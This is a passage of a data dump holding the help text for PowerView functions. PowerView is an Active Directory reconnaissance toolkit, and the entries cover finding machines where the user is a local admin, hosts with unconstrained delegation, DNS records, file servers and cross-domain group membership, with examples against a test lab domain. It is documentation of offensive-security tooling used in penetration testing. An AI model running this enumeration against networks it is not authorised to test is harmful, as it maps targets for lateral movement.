                          'spends searching. Default of 120 seconds.\n'
                          '\n'
                          '.PARAMETER Tombstone\n'
                          '\n'
                          'Switch. Specifies that the searcher should also '
                          'return deleted/tombstoned objects.\n'
                          '\n'
                          '.PARAMETER Credential\n'
                          '\n'
                          'A [Management.Automation.PSCredential] object of '
                          'alternate credentials\n'
                          'for connection to the target domain and target '
                          'systems.\n'
                          '\n'
                          '.PARAMETER Delay\n'
                          '\n'
                          'Specifies the delay (in seconds) between '
                          'enumerating hosts, defaults to 0.\n'
                          '\n'
                          '.PARAMETER Jitter\n'
                          '\n'
                          'Specifies the jitter (0-1.0) to apply to any '
                          'specified -Delay, defaults to +/- 0.3\n'
                          '\n'
                          '.PARAMETER Threads\n'
                          '\n'
                          'The number of threads to use for user searching, '
                          'defaults to 20.\n'
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          'Find-LocalAdminAccess\n'
                          '\n'
                          'Finds machines in the current domain the current '
                          'user has admin access to.\n'
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          'Find-LocalAdminAccess -Domain dev.testlab.local\n'
                          '\n'
                          'Finds machines in the dev.testlab.local domain the '
                          'current user has admin access to.\n'
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          '$SecPassword = ConvertTo-SecureString '
                          "'Password123!' -AsPlainText -Force\n"
                          '$Cred = New-Object '
                          "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                          '$SecPassword)\n'
                          'Find-LocalAdminAccess -Domain testlab.local '
                          '-Credential $Cred\n'
                          '\n'
                          'Finds machines in the testlab.local domain that the '
                          'user with the specified -Credential\n'
                          'has admin access to.\n'
                          '\n'
                          '.OUTPUTS\n'
                          '\n'
                          'String\n'
                          '\n'
                          'Computer dnshostnames the current user has '
                          'administrative access to.\n',
 'Get-Domain': '.SYNOPSIS\n'
               '\n'
               'Returns the domain object for the current (or specified) '
               'domain.\n'
               '\n'
               'Author: Will Schroeder (@harmj0y)  \n'
               'License: BSD 3-Clause  \n'
               'Required Dependencies: None  \n'
               '\n'
               '.DESCRIPTION\n'
               '\n'
               'Returns a System.DirectoryServices.ActiveDirectory.Domain '
               'object for the current\n'
               'domain or the domain specified with -Domain X.\n'
               '\n'
               '.PARAMETER Domain\n'
               '\n'
               'Specifies the domain name to query for, defaults to the '
               'current domain.\n'
               '\n'
               '.PARAMETER Credential\n'
               '\n'
               'A [Management.Automation.PSCredential] object of alternate '
               'credentials\n'
               'for connection to the target domain.\n'
               '\n'
               '.EXAMPLE\n'
               '\n'
               'Get-Domain -Domain testlab.local\n'
               '\n'
               '.EXAMPLE\n'
               '\n'
               "$SecPassword = ConvertTo-SecureString 'Password123!' "
               '-AsPlainText -Force\n'
               '$Cred = New-Object '
               "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
               '$SecPassword)\n'
               'Get-Domain -Credential $Cred\n'
               '\n'
               '.OUTPUTS\n'
               '\n'
               'System.DirectoryServices.ActiveDirectory.Domain\n'
               '\n'
               'A complex .NET domain object.\n'
               '\n'
               '.LINK\n'
               '\n'
               'http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG\n',
 'Get-DomainComputer': '.SYNOPSIS\n'
                       '\n'
                       'Return all computers or specific computer objects in '
                       'AD.\n'
                       '\n'
                       'Author: Will Schroeder (@harmj0y)  \n'
                       'License: BSD 3-Clause  \n'
                       'Required Dependencies: Get-DomainSearcher, '
                       'Convert-LDAPProperty  \n'
                       '\n'
                       '.DESCRIPTION\n'
                       '\n'
                       'Builds a directory searcher object using '
                       'Get-DomainSearcher, builds a custom\n'
                       'LDAP filter based on targeting/filter parameters, and '
                       'searches for all objects\n'
                       'matching the criteria. To only return specific '
                       'properties, use\n'
                       '"-Properties samaccountname,usnchanged,...". By '
                       'default, all computer objects for\n'
                       'the current domain are returned.\n'
                       '\n'
                       '.PARAMETER Identity\n'
                       '\n'
                       'A SamAccountName (e.g. WINDOWS10$), DistinguishedName '
                       '(e.g. CN=WINDOWS10,CN=Computers,DC=testlab,DC=local),\n'
                       'SID (e.g. '
                       'S-1-5-21-890171859-3433809279-3366196753-1124), GUID '
                       '(e.g. 4f16b6bc-7010-4cbf-b628-f3cfe20f6994),\n'
                       'or a dns host name (e.g. windows10.testlab.local). '
                       'Wildcards accepted.\n'
                       '\n'
                       '.PARAMETER UACFilter\n'
                       '\n'
                       'Dynamic parameter that accepts one or more values from '
                       '$UACEnum, including\n'
                       '"NOT_X" negation forms. To see all possible values, '
                       "run '0|ConvertFrom-UACValue -ShowAll'.\n"
                       '\n'
                       '.PARAMETER Unconstrained\n'
                       '\n'
                       'Switch. Return computer objects that have '
                       'unconstrained delegation.\n'
                       '\n'
                       '.PARAMETER TrustedToAuth\n'
                       '\n'
                       'Switch. Return computer objects that are trusted to '
                       'authenticate for other principals.\n'
                       '\n'
                       '.PARAMETER Printers\n'
                       '\n'
                       'Switch. Return only printers.\n'
                       '\n'
                       '.PARAMETER SPN\n'
                       '\n'
                       'Return computers with a specific service principal '
                       'name, wildcards accepted.\n'
                       '\n'
                       '.PARAMETER OperatingSystem\n'
                       '\n'
                       'Return computers with a specific operating system, '
                       'wildcards accepted.\n'
                       '\n'
                       '.PARAMETER ServicePack\n'
                       '\n'
                       'Return computers with a specific service pack, '
                       'wildcards accepted.\n'
                       '\n'
                       '.PARAMETER SiteName\n'
                       '\n'
                       'Return computers in the specific AD Site name, '
                       'wildcards accepted.\n'
                       '\n'
                       '.PARAMETER Ping\n'
                       '\n'
                       "Switch. Ping each host to ensure it's up before "
                       'enumerating.\n'
                       '\n'
                       '.PARAMETER Domain\n'
                       '\n'
                       'Specifies the domain to use for the query, defaults to '
                       'the current domain.\n'
                       '\n'
                       '.PARAMETER LDAPFilter\n'
                       '\n'
                       'Specifies an LDAP query string that is used to filter '
                       'Active Directory objects.\n'
                       '\n'
                       '.PARAMETER Properties\n'
                       '\n'
                       'Specifies the properties of the output object to '
                       'retrieve from the server.\n'
                       '\n'
                       '.PARAMETER SearchBase\n'
                       '\n'
                       'The LDAP source to search through, e.g. '
                       '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                       'Useful for OU queries.\n'
                       '\n'
                       '.PARAMETER Server\n'
                       '\n'
                       'Specifies an Active Directory server (domain '
                       'controller) to bind to.\n'
                       '\n'
                       '.PARAMETER SearchScope\n'
                       '\n'
                       'Specifies the scope to search under, '
                       'Base/OneLevel/Subtree (default of Subtree).\n'
                       '\n'
                       '.PARAMETER ResultPageSize\n'
                       '\n'
                       'Specifies the PageSize to set for the LDAP searcher '
                       'object.\n'
                       '\n'
                       '.PARAMETER ServerTimeLimit\n'
                       '\n'
                       'Specifies the maximum amount of time the server spends '
                       'searching. Default of 120 seconds.\n'
                       '\n'
                       '.PARAMETER SecurityMasks\n'
                       '\n'
                       'Specifies an option for examining security information '
                       'of a directory object.\n'
                       "One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n"
                       '\n'
                       '.PARAMETER Tombstone\n'
                       '\n'
                       'Switch. Specifies that the searcher should also return '
                       'deleted/tombstoned objects.\n'
                       '\n'
                       '.PARAMETER FindOne\n'
                       '\n'
                       'Only return one result object.\n'
                       '\n'
                       '.PARAMETER Credential\n'
                       '\n'
                       'A [Management.Automation.PSCredential] object of '
                       'alternate credentials\n'
                       'for connection to the target domain.\n'
                       '\n'
                       '.PARAMETER Raw\n'
                       '\n'
                       'Switch. Return raw results instead of translating the '
                       'fields into a custom PSObject.\n'
                       '\n'
                       '.EXAMPLE\n'
                       '\n'
                       'Get-DomainComputer\n'
                       '\n'
                       'Returns the current computers in current domain.\n'
                       '\n'
                       '.EXAMPLE\n'
                       '\n'
                       'Get-DomainComputer -SPN mssql* -Domain testlab.local\n'
                       '\n'
                       'Returns all MS SQL servers in the testlab.local '
                       'domain.\n'
                       '\n'
                       '.EXAMPLE\n'
                       '\n'
                       'Get-DomainComputer -UACFilter '
                       'TRUSTED_FOR_DELEGATION,SERVER_TRUST_ACCOUNT '
                       '-Properties dnshostname\n'
                       '\n'
                       'Return the dns hostnames of servers trusted for '
                       'delegation.\n'
                       '\n'
                       '.EXAMPLE\n'
                       '\n'
                       'Get-DomainComputer -SearchBase '
                       '"LDAP://OU=secret,DC=testlab,DC=local" -Unconstrained\n'
                       '\n'
                       'Search the specified OU for computeres that allow '
                       'unconstrained delegation.\n'
                       '\n'
                       '.EXAMPLE\n'
                       '\n'
                       "$SecPassword = ConvertTo-SecureString 'Password123!' "
                       '-AsPlainText -Force\n'
                       '$Cred = New-Object '
                       "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                       '$SecPassword)\n'
                       'Get-DomainComputer -Credential $Cred\n'
                       '\n'
                       '.OUTPUTS\n'
                       '\n'
                       'PowerView.Computer\n'
                       '\n'
                       'Custom PSObject with translated computer property '
                       'fields.\n'
                       '\n'
                       'PowerView.Computer.Raw\n'
                       '\n'
                       'The raw DirectoryServices.SearchResult object, if -Raw '
                       'is enabled.\n',
 'Get-DomainController': '.SYNOPSIS\n'
                         '\n'
                         'Return the domain controllers for the current (or '
                         'specified) domain.\n'
                         '\n'
                         'Author: Will Schroeder (@harmj0y)  \n'
                         'License: BSD 3-Clause  \n'
                         'Required Dependencies: Get-DomainComputer, '
                         'Get-Domain  \n'
                         '\n'
                         '.DESCRIPTION\n'
                         '\n'
                         'Enumerates the domain controllers for the current or '
                         'specified domain.\n'
                         'By default built in .NET methods are used. The -LDAP '
                         'switch uses Get-DomainComputer\n'
                         'to search for domain controllers.\n'
                         '\n'
                         '.PARAMETER Domain\n'
                         '\n'
                         'The domain to query for domain controllers, defaults '
                         'to the current domain.\n'
                         '\n'
                         '.PARAMETER Server\n'
                         '\n'
                         'Specifies an Active Directory server (domain '
                         'controller) to bind to.\n'
                         '\n'
                         '.PARAMETER LDAP\n'
                         '\n'
                         'Switch. Use LDAP queries to determine the domain '
                         'controllers instead of built in .NET methods.\n'
                         '\n'
                         '.PARAMETER Credential\n'
                         '\n'
                         'A [Management.Automation.PSCredential] object of '
                         'alternate credentials\n'
                         'for connection to the target domain.\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         "Get-DomainController -Domain 'test.local'\n"
                         '\n'
                         "Determine the domain controllers for 'test.local'.\n"
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         "Get-DomainController -Domain 'test.local' -LDAP\n"
                         '\n'
                         "Determine the domain controllers for 'test.local' "
                         'using LDAP queries.\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         "'test.local' | Get-DomainController\n"
                         '\n'
                         "Determine the domain controllers for 'test.local'.\n"
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         "$SecPassword = ConvertTo-SecureString 'Password123!' "
                         '-AsPlainText -Force\n'
                         '$Cred = New-Object '
                         "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                         '$SecPassword)\n'
                         'Get-DomainController -Credential $Cred\n'
                         '\n'
                         '.OUTPUTS\n'
                         '\n'
                         'PowerView.Computer\n'
                         '\n'
                         'Outputs custom PSObjects with details about the '
                         'enumerated domain controller if -LDAP is specified.\n'
                         '\n'
                         'System.DirectoryServices.ActiveDirectory.DomainController\n'
                         '\n'
                         "If -LDAP isn't specified.\n",
 'Get-DomainDFSShare': '.SYNOPSIS\n'
                       '\n'
                       'Returns a list of all fault-tolerant distributed file '
                       'systems\n'
                       'for the current (or specified) domains.\n'
                       '\n'
                       'Author: Ben Campbell (@meatballs__)  \n'
                       'License: BSD 3-Clause  \n'
                       'Required Dependencies: Get-DomainSearcher  \n'
                       '\n'
                       '.DESCRIPTION\n'
                       '\n'
                       'This function searches for all distributed file '
                       'systems (either version\n'
                       '1, 2, or both depending on -Version X) by searching '
                       'for domain objects\n'
                       'matching (objectClass=fTDfs) or '
                       '(objectClass=msDFS-Linkv2), respectively\n'
                       'The server data is parsed appropriately and returned.\n'
                       '\n'
                       '.PARAMETER Domain\n'
                       '\n'
                       'Specifies the domains to use for the query, defaults '
                       'to the current domain.\n'
                       '\n'
                       '.PARAMETER SearchBase\n'
                       '\n'
                       'The LDAP source to search through, e.g. '
                       '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                       'Useful for OU queries.\n'
                       '\n'
                       '.PARAMETER Server\n'
                       '\n'
                       'Specifies an Active Directory server (domain '
                       'controller) to bind to.\n'
                       '\n'
                       '.PARAMETER SearchScope\n'
                       '\n'
                       'Specifies the scope to search under, '
                       'Base/OneLevel/Subtree (default of Subtree).\n'
                       '\n'
                       '.PARAMETER ResultPageSize\n'
                       '\n'
                       'Specifies the PageSize to set for the LDAP searcher '
                       'object.\n'
                       '\n'
                       '.PARAMETER ServerTimeLimit\n'
                       '\n'
                       'Specifies the maximum amount of time the server spends '
                       'searching. Default of 120 seconds.\n'
                       '\n'
                       '.PARAMETER Tombstone\n'
                       '\n'
                       'Switch. Specifies that the searcher should also return '
                       'deleted/tombstoned objects.\n'
                       '\n'
                       '.PARAMETER Credential\n'
                       '\n'
                       'A [Management.Automation.PSCredential] object of '
                       'alternate credentials\n'
                       'for connection to the target domain.\n'
                       '\n'
                       '.EXAMPLE\n'
                       '\n'
                       'Get-DomainDFSShare\n'
                       '\n'
                       'Returns all distributed file system shares for the '
                       'current domain.\n'
                       '\n'
                       '.EXAMPLE\n'
                       '\n'
                       'Get-DomainDFSShare -Domain testlab.local\n'
                       '\n'
                       'Returns all distributed file system shares for the '
                       "'testlab.local' domain.\n"
                       '\n'
                       '.EXAMPLE\n'
                       '\n'
                       "$SecPassword = ConvertTo-SecureString 'Password123!' "
                       '-AsPlainText -Force\n'
                       '$Cred = New-Object '
                       "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                       '$SecPassword)\n'
                       'Get-DomainDFSShare -Credential $Cred\n'
                       '\n'
                       '.OUTPUTS\n'
                       '\n'
                       'System.Management.Automation.PSCustomObject\n'
                       '\n'
                       'A custom PSObject describing the distributed file '
                       'systems.\n',
 'Get-DomainDNSRecord': '.SYNOPSIS\n'
                        '\n'
                        'Enumerates the Active Directory DNS records for a '
                        'given zone.\n'
                        '\n'
                        'Author: Will Schroeder (@harmj0y)  \n'
                        'License: BSD 3-Clause  \n'
                        'Required Dependencies: Get-DomainSearcher, '
                        'Convert-LDAPProperty, Convert-DNSRecord  \n'
                        '\n'
                        '.DESCRIPTION\n'
                        '\n'
                        'Given a specific Active Directory DNS zone name, '
                        "query for all 'dnsNode'\n"
                        'LDAP entries using that zone as the search base. '
                        'Return all DNS entry results\n'
                        'and use Convert-DNSRecord to try to convert the '
                        'binary DNS record blobs.\n'
                        '\n'
                        '.PARAMETER ZoneName\n'
                        '\n'
                        'Specifies the zone to query for records (which can be '
                        'enumearted with Get-DomainDNSZone).\n'
                        '\n'
                        '.PARAMETER Domain\n'
                        '\n'
                        'The domain to query for zones, defaults to the '
                        'current domain.\n'
                        '\n'
                        '.PARAMETER Server\n'
                        '\n'
                        'Specifies an Active Directory server (domain '
                        'controller) to bind to for the search.\n'
                        '\n'
                        '.PARAMETER Properties\n'
                        '\n'
                        'Specifies the properties of the output object to '
                        'retrieve from the server.\n'
                        '\n'
                        '.PARAMETER ResultPageSize\n'
                        '\n'
                        'Specifies the PageSize to set for the LDAP searcher '
                        'object.\n'
                        '\n'
                        '.PARAMETER ServerTimeLimit\n'
                        '\n'
                        'Specifies the maximum amount of time the server '
                        'spends searching. Default of 120 seconds.\n'
                        '\n'
                        '.PARAMETER FindOne\n'
                        '\n'
                        'Only return one result object.\n'
                        '\n'
                        '.PARAMETER Credential\n'
                        '\n'
                        'A [Management.Automation.PSCredential] object of '
                        'alternate credentials\n'
                        'for connection to the target domain.\n'
                        '\n'
                        '.EXAMPLE\n'
                        '\n'
                        'Get-DomainDNSRecord -ZoneName testlab.local\n'
                        '\n'
                        'Retrieve all records for the testlab.local zone.\n'
                        '\n'
                        '.EXAMPLE\n'
                        '\n'
                        'Get-DomainDNSZone | Get-DomainDNSRecord\n'
                        '\n'
                        'Retrieve all records for all zones in the current '
                        'domain.\n'
                        '\n'
                        '.EXAMPLE\n'
                        '\n'
                        'Get-DomainDNSZone -Domain dev.testlab.local | '
                        'Get-DomainDNSRecord -Domain dev.testlab.local\n'
                        '\n'
                        'Retrieve all records for all zones in the '
                        'dev.testlab.local domain.\n'
                        '\n'
                        '.OUTPUTS\n'
                        '\n'
                        'PowerView.DNSRecord\n'
                        '\n'
                        'Outputs custom PSObjects with detailed information '
                        'about the DNS record entry.\n',
 'Get-DomainDNSZone': '.SYNOPSIS\n'
                      '\n'
                      'Enumerates the Active Directory DNS zones for a given '
                      'domain.\n'
                      '\n'
                      'Author: Will Schroeder (@harmj0y)  \n'
                      'License: BSD 3-Clause  \n'
                      'Required Dependencies: Get-DomainSearcher, '
                      'Convert-LDAPProperty  \n'
                      '\n'
                      '.PARAMETER Domain\n'
                      '\n'
                      'The domain to query for zones, defaults to the current '
                      'domain.\n'
                      '\n'
                      '.PARAMETER Server\n'
                      '\n'
                      'Specifies an Active Directory server (domain '
                      'controller) to bind to for the search.\n'
                      '\n'
                      '.PARAMETER Properties\n'
                      '\n'
                      'Specifies the properties of the output object to '
                      'retrieve from the server.\n'
                      '\n'
                      '.PARAMETER ResultPageSize\n'
                      '\n'
                      'Specifies the PageSize to set for the LDAP searcher '
                      'object.\n'
                      '\n'
                      '.PARAMETER ServerTimeLimit\n'
                      '\n'
                      'Specifies the maximum amount of time the server spends '
                      'searching. Default of 120 seconds.\n'
                      '\n'
                      '.PARAMETER FindOne\n'
                      '\n'
                      'Only return one result object.\n'
                      '\n'
                      '.PARAMETER Credential\n'
                      '\n'
                      'A [Management.Automation.PSCredential] object of '
                      'alternate credentials\n'
                      'for connection to the target domain.\n'
                      '\n'
                      '.EXAMPLE\n'
                      '\n'
                      'Get-DomainDNSZone\n'
                      '\n'
                      'Retrieves the DNS zones for the current domain.\n'
                      '\n'
                      '.EXAMPLE\n'
                      '\n'
                      'Get-DomainDNSZone -Domain dev.testlab.local -Server '
                      'primary.testlab.local\n'
                      '\n'
                      'Retrieves the DNS zones for the dev.testlab.local '
                      'domain, binding to primary.testlab.local.\n'
                      '\n'
                      '.OUTPUTS\n'
                      '\n'
                      'PowerView.DNSZone\n'
                      '\n'
                      'Outputs custom PSObjects with detailed information '
                      'about the DNS zone.\n',
 'Get-DomainFileServer': '.SYNOPSIS\n'
                         '\n'
                         'Returns a list of servers likely functioning as file '
                         'servers.\n'
                         '\n'
                         'Author: Will Schroeder (@harmj0y)  \n'
                         'License: BSD 3-Clause  \n'
                         'Required Dependencies: Get-DomainSearcher  \n'
                         '\n'
                         '.DESCRIPTION\n'
                         '\n'
                         'Returns a list of likely fileservers by searching '
                         'for all users in Active Directory\n'
                         'with non-null homedirectory, scriptpath, or '
                         'profilepath fields, and extracting/uniquifying\n'
                         'the server names.\n'
                         '\n'
                         '.PARAMETER Domain\n'
                         '\n'
                         'Specifies the domain to use for the query, defaults '
                         'to the current domain.\n'
                         '\n'
                         '.PARAMETER LDAPFilter\n'
                         '\n'
                         'Specifies an LDAP query string that is used to '
                         'filter Active Directory objects.\n'
                         '\n'
                         '.PARAMETER SearchBase\n'
                         '\n'
                         'The LDAP source to search through, e.g. '
                         '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                         'Useful for OU queries.\n'
                         '\n'
                         '.PARAMETER Server\n'
                         '\n'
                         'Specifies an Active Directory server (domain '
                         'controller) to bind to.\n'
                         '\n'
                         '.PARAMETER SearchScope\n'
                         '\n'
                         'Specifies the scope to search under, '
                         'Base/OneLevel/Subtree (default of Subtree).\n'
                         '\n'
                         '.PARAMETER ResultPageSize\n'
                         '\n'
                         'Specifies the PageSize to set for the LDAP searcher '
                         'object.\n'
                         '\n'
                         '.PARAMETER ServerTimeLimit\n'
                         '\n'
                         'Specifies the maximum amount of time the server '
                         'spends searching. Default of 120 seconds.\n'
                         '\n'
                         '.PARAMETER Tombstone\n'
                         '\n'
                         'Switch. Specifies that the searcher should also '
                         'return deleted/tombstoned objects.\n'
                         '\n'
                         '.PARAMETER Credential\n'
                         '\n'
                         'A [Management.Automation.PSCredential] object of '
                         'alternate credentials\n'
                         'for connection to the target domain.\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         'Get-DomainFileServer\n'
                         '\n'
                         'Returns active file servers for the current domain.\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         'Get-DomainFileServer -Domain testing.local\n'
                         '\n'
                         "Returns active file servers for the 'testing.local' "
                         'domain.\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         "$SecPassword = ConvertTo-SecureString 'Password123!' "
                         '-AsPlainText -Force\n'
                         '$Cred = New-Object '
                         "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                         '$SecPassword)\n'
                         'Get-DomainFileServer -Credential $Cred\n'
                         '\n'
                         '.OUTPUTS\n'
                         '\n'
                         'String\n'
                         '\n'
                         'One or more strings representing file server '
                         'names.\n',
 'Get-DomainForeignGroupMember': '.SYNOPSIS\n'
                                 '\n'
                                 'Enumerates groups with users outside of the '
                                 "group's domain and returns\n"
                                 "each foreign member. This is a domain's "
                                 '"incoming" access.\n'
                                 '\n'
                                 'Author: Will Schroeder (@harmj0y)  \n'
                                 'License: BSD 3-Clause  \n'
                                 'Required Dependencies: Get-Domain, '
                                 'Get-DomainGroup  \n'
                                 '\n'
                                 '.DESCRIPTION\n'
                                 '\n'
                                 'Uses Get-DomainGroup to enumerate all groups '
                                 'for the current (or target) domain,\n'
                                 'then enumerates the members of each group, '
                                 "and compares the member's domain\n"
                                 "name to the parent group's domain name, "
                                 'outputting the member if the domains '
                                 'differ.\n'
                                 '\n'
                                 '.PARAMETER Domain\n'
                                 '\n'
                                 'Specifies the domain to use for the query, '
                                 'defaults to the current domain.\n'
                                 '\n'
                                 '.PARAMETER LDAPFilter\n'
                                 '\n'
                                 'Specifies an LDAP query string that is used '
                                 'to filter Active Directory objects.\n'
                                 '\n'
                                 '.PARAMETER Properties\n'
                                 '\n'
                                 'Specifies the properties of the output '
                                 'object to retrieve from the server.\n'
                                 '\n'
                                 '.PARAMETER SearchBase\n'
                                 '\n'
                                 'The LDAP source to search through, e.g. '
                                 '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                                 'Useful for OU queries.\n'
                                 '\n'
                                 '.PARAMETER Server\n'
                                 '\n'
                                 'Specifies an Active Directory server (domain '
                                 'controller) to bind to.\n'
                                 '\n'
                                 '.PARAMETER SearchScope\n'
                                 '\n'
                                 'Specifies the scope to search under, '
                                 'Base/OneLevel/Subtree (default of Subtree).\n'
                                 '\n'
                                 '.PARAMETER ResultPageSize\n'
                                 '\n'
                                 'Specifies the PageSize to set for the LDAP '
                                 'searcher object.\n'
                                 '\n'
                                 '.PARAMETER ServerTimeLimit\n'
                                 '\n'
                                 'Specifies the maximum amount of time the '
                                 'server spends searching. Default of 120 '
                                 'seconds.\n'
                                 '\n'
                                 '.PARAMETER SecurityMasks\n'
                                 '\n'
                                 'Specifies an option for examining security '
                                 'information of a directory object.\n'
                                 "One of 'Dacl', 'Group', 'None', 'Owner', "
                                 "'Sacl'.\n"
                                 '\n'
                                 '.PARAMETER Tombstone\n'
                                 '\n'
                                 'Switch. Specifies that the searcher should '
                                 'also return deleted/tombstoned objects.\n'
                                 '\n'
                                 '.PARAMETER Credential\n'
                                 '\n'
                                 'A [Management.Automation.PSCredential] '
                                 'object of alternate credentials\n'
                                 'for connection to the target domain.\n'
                                 '\n'
                                 '.EXAMPLE\n'
                                 '\n'
                                 'Get-DomainForeignGroupMember\n'
                                 '\n'
                                 'Return all group members in the current '
                                 'domain where the group and member differ.\n'
                                 '\n'
                                 '.EXAMPLE\n'
                                 '\n'
                                 'Get-DomainForeignGroupMember -Domain '
                                 'dev.testlab.local\n'
                                 '\n'
                                 'Return all group members in the '
                                 'dev.testlab.local domain where the member is '
                                 'not in dev.testlab.local.\n'
                                 '\n'
                                 '.EXAMPLE\n'
                                 '\n'
                                 '$SecPassword = ConvertTo-SecureString '
                                 "'Password123!' -AsPlainText -Force\n"
                                 '$Cred = New-Object '
                                 "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                                 '$SecPassword)\n'
                                 'Get-DomainForeignGroupMember -Domain '
                                 'dev.testlab.local -Server '
                                 'secondary.dev.testlab.local -Credential '
                                 '$Cred\n'
                                 '\n'
                                 'Return all group members in the '
                                 'dev.testlab.local domain where the member '
                                 'is\n'
                                 'not in dev.testlab.local. binding to the '
                                 'secondary.dev.testlab.local for\n'
                                 'queries, and using the specified alternate '
                                 'credentials.\n'
                                 '\n'
                                 '.OUTPUTS\n'
                                 '\n'
                                 'PowerView.ForeignGroupMember\n'
                                 '\n'
                                 'Custom PSObject with translated group member '
                                 'property fields.\n',
 'Get-DomainForeignUser': '.SYNOPSIS\n'
                          '\n'
                          'Enumerates users who are in groups outside of the '
                          "user's domain.\n"
                          'This is a domain\'s "outgoing" access.\n'
                          '\n'
                          'Author: Will Schroeder (@harmj0y)  \n'
                          'License: BSD 3-Clause  \n'
                          'Required Dependencies: Get-Domain, '
                          'Get-DomainUser  \n'
                          '\n'
                          '.DESCRIPTION\n'
                          '\n'
                          'Uses Get-DomainUser to enumerate all users for the '
                          'current (or target) domain,\n'
                          "then calculates the given user's domain name based "
                          "on the user's distinguishedName.\n"
                          'This domain name is compared to the queried domain, '
                          'and the user object is\n'
                          'output if they differ.\n'
                          '\n'
                          '.PARAMETER Domain\n'
                          '\n'
                          'Specifies the domain to use for the query, defaults '
                          'to the current domain.\n'
                          '\n'
                          '.PARAMETER LDAPFilter\n'
                          '\n'
                          'Specifies an LDAP query string that is used to '
                          'filter Active Directory objects.\n'
                          '\n'
                          '.PARAMETER Properties\n'
                          '\n'
                          'Specifies the properties of the output object to '
                          'retrieve from the server.\n'
                          '\n'
                          '.PARAMETER SearchBase\n'
                          '\n'
                          'The LDAP source to search through, e.g. '
                          '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                          'Useful for OU queries.\n'
                          '\n'
                          '.PARAMETER Server\n'
                          '\n'
                          'Specifies an Active Directory server (domain '
                          'controller) to bind to.\n'
                          '\n'
                          '.PARAMETER SearchScope\n'
                          '\n'
                          'Specifies the scope to search under, '
                          'Base/OneLevel/Subtree (default of Subtree).\n'
                          '\n'
                          '.PARAMETER ResultPageSize\n'
                          '\n'
                          'Specifies the PageSize to set for the LDAP searcher '
                          'object.\n'
                          '\n'
                          '.PARAMETER ServerTimeLimit\n'
                          '\n'
                          'Specifies the maximum amount of time the server '
                          'spends searching. Default of 120 seconds.\n'
                          '\n'
                          '.PARAMETER SecurityMasks\n'
                          '\n'
                          'Specifies an option for examining security '
                          'information of a directory object.\n'
                          "One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n"
                          '\n'
                          '.PARAMETER Tombstone\n'
                          '\n'
                          'Switch. Specifies that the searcher should also '
                          'return deleted/tombstoned objects.\n'
                          '\n'
                          '.PARAMETER Credential\n'
                          '\n'
                          'A [Management.Automation.PSCredential] object of '
                          'alternate credentials\n'
                          'for connection to the target domain.\n'
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          'Get-DomainForeignUser\n'
                          '\n'
                          'Return all users in the current domain who are in '
                          'groups not in the\n'
                          'current domain.\n'
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          'Get-DomainForeignUser -Domain dev.testlab.local\n'
                          '\n'
                          'Return all users in the dev.testlab.local domain '
                          'who are in groups not in the\n'
                          'dev.testlab.local domain.\n'
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          '$SecPassword = ConvertTo-SecureString '
                          "'Password123!' -AsPlainText -Force\n"
                          '$Cred = New-Object '
                          "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                          '$SecPassword)\n'
                          'Get-DomainForeignUser -Domain dev.testlab.local '
                          '-Server secondary.dev.testlab.local -Credential '
                          '$Cred\n'
                          '\n'
                          'Return all users in the dev.testlab.local domain '
                          'who are in groups not in the\n'
                          'dev.testlab.local domain, binding to the '
                          'secondary.dev.testlab.local for queries, and\n'
                          'using the specified alternate credentials.\n'
                          '\n'
                          '.OUTPUTS\n'
                          '\n'
                          'PowerView.ForeignUser\n'
                          '\n'
                          'Custom PSObject with translated user property '
                          'fields.\n',
 'Get-DomainGPO': '.SYNOPSIS\n'
                  '\n'
                  'Return all GPOs or specific GPO objects in AD.\n'
                  '\n'
                  'Author: Will Schroeder (@harmj0y)  \n'
                  'License: BSD 3-Clause  \n'
                  'Required Dependencies: Get-DomainSearcher, '
                  'Get-DomainComputer, Get-DomainUser, Get-DomainOU, '
                  'Get-NetComputerSiteName, Get-DomainSite, Get-DomainObject, '
                  'Convert-LDAPProperty  \n'
                  '\n'
                  '.DESCRIPTION\n'
                  '\n'
                  'Builds a directory searcher object using '
                  'Get-DomainSearcher, builds a custom\n'
                  'LDAP filter based on targeting/filter parameters, and '
                  'searches for all objects\n'
                  'matching the criteria. To only return specific properties, '
                  'use\n'
                  '"-Properties samaccountname,usnchanged,...". By default, '
                  'all GPO objects for\n'
                  'the current domain are returned. To enumerate all GPOs that '
                  'are applied to\n'
                  'a particular machine, use -ComputerName X.\n'
                  '\n'
                  '.PARAMETER Identity\n'
                  '\n'
                  "A display name (e.g. 'Test GPO'), DistinguishedName (e.g. "
                  "'CN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=local'),\n"
                  "GUID (e.g. '10ec320d-3111-4ef4-8faf-8f14f4adc789'), or GPO "
                  "name (e.g. '{F260B76D-55C8-46C5-BEF1-9016DD98E272}'). "
